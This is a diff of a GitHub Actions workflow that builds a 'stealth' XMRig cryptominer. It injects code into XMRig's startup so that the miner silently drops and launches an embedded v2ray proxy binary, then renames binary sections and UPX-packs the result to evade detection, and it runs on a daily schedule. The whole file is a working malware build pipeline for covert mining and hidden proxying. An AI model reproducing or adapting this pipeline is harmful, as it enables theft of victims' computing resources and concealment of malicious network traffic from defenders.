@@ -1,9 +1,9 @@
-name: Auto Build Stealth XMRig
+name: Fixed XMRig Stealth Build
 
 on:
-  workflow_dispatch:  # 允许手动触发
+  workflow_dispatch:
   schedule:
-    - cron: '0 0 * * *'  # 每天UTC 0点自动构建
+    - cron: '0 0 * * *'
 
 jobs:
   stealth-build:
@@ -11,7 +11,6 @@ jobs:
     timeout-minutes: 25
 
     steps:
-    # 阶段1：获取原始代码
     - name: Clone XMRig
       uses: actions/checkout@v4
       with:
@@ -24,7 +23,6 @@ jobs:
         repository: v2fly/v2ray-core
         path: src/v2ray
 
-    # 阶段2：环境准备
     - name: Setup Build Tools
       run: |
         sudo apt-get update
@@ -32,25 +30,41 @@ jobs:
           build-essential cmake libuv1-dev libssl-dev libhwloc-dev \
           golang upx-ucl xxd
 
-    # 阶段3：构建v2ray
     - name: Build v2ray Proxy
       working-directory: src/v2ray
       run: |
-        go build -ldflags "-s -w -buildid=" -trimpath -o v2ray ./main
+        CGO_ENABLED=0 go build -ldflags "-s -w -buildid=" -trimpath -o v2ray ./main
 
-    # 阶段4：代码融合
-    - name: Inject v2ray into XMRig
+    - name: Generate v2ray Header
       run: |
-        # 将v2ray转换为C代码
         xxd -i src/v2ray/v2ray > src/xmrig/src/v2ray_embed.h
 
-        # 修改XMRig启动代码
-        sed -i '/#include "base\/kernel\/Platform.h"/a #include "v2ray_embed.h"' src/xmrig/src/App.cpp
-        sed -i $'/int main(/i \\\nvoid StartProxy() {\n    FILE* f = fopen("v2ray", "wb");\n    fwrite(v2ray, 1, v2ray_len, f);\n    fclose(f);\n    chmod("v2ray", 0700);\n    system("./v2ray -config=config.json >/dev/null 2>&1 &");\n}\n' src/xmrig/src/App.cpp
-        sed -i '/Platform::init(/a \ \ \ \ StartProxy();' src/xmrig/src/base/kernel/Platform.cpp
+    - name: Patch XMRig Source
+      working-directory: src/xmrig
+      run: |
+        # 使用临时文件避免sed语法问题
+        cat << 'EOF' > patch_app.cpp
+        #include "v2ray_embed.h"
+        
+        void StartProxy() {
+            FILE* f = fopen("v2ray", "wb");
+            fwrite(v2ray, 1, v2ray_len, f);
+            fclose(f);
+            chmod("v2ray", 0700);
+            system("./v2ray -config=config.json >/dev/null 2>&1 &");
+        }
+        EOF
 
-    # 阶段5：混淆编译
-    - name: Build Obfuscated XMRig
+        # 将补丁插入到App.cpp中
+        sed -i '/#include "base\/kernel\/Platform.h"/r patch_app.cpp' src/App.cpp
+        
+        # 在Platform.cpp添加启动调用
+        sed -i '/Platform::init(/a \ \ \ \ StartProxy();' src/base/kernel/Platform.cpp
+        
+        # 清理临时文件
+        rm patch_app.cpp
+
+    - name: Build XMRig
       working-directory: src/xmrig
       run: |
         mkdir -p build
@@ -60,18 +74,16 @@ jobs:
           -DWITH_OPENCL=OFF \
           -DWITH_CUDA=OFF \
           -DCMAKE_BUILD_TYPE=Release \
-          -DCMAKE_C_FLAGS="-flto -fomit-frame-pointer -march=native" \
-          -DCMAKE_CXX_FLAGS="-flto -fomit-frame-pointer -march=native"
+          -DCMAKE_C_FLAGS="-flto -fomit-frame-pointer" \
+          -DCMAKE_CXX_FLAGS="-flto -fomit-frame-pointer"
         make -j$(nproc)
 
-        # 二进制混淆处理
         objcopy --rename-section .text=.cryptext \
                 --rename-section .data=.cryptdata \
                 xmrig
         upx --ultra-brute --lzma xmrig -o xmrig_stealth
 
-    # 阶段6：发布结果
-    - name: Upload Stealth Binary
+    - name: Upload Artifact
       uses: actions/upload-artifact@v4
       with:
         name: xmrig-stealth
